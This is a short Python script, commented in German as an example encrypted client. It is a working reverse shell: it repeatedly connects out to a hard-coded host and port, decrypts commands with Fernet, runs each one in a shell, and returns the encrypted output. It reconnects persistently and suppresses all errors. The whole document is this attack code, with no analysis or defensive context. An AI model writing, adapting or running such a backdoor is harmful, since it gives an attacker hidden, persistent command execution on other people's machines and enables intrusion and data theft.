# Beispiel-Client (verschlüsselt)
import socket
import ssl
from cryptography.fernet import Fernet
import subprocess
import sys
import time

KEY = b'...'  # vom Server generierter Schlüssel
SERVER = "192.168.1.100"
PORT = 4443

cipher = Fernet(KEY)
while True:
    try:
        sock = socket.socket()
        sock.connect((SERVER, PORT))
        while True:
            enc_cmd = sock.recv(4096)
            if not enc_cmd:
                break
            cmd = cipher.decrypt(enc_cmd).decode()
            if cmd == "exit":
                break
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            out, err = proc.communicate()
            sock.send(cipher.encrypt(out + err))
        sock.close()
    except:
        time.sleep(5)
        continue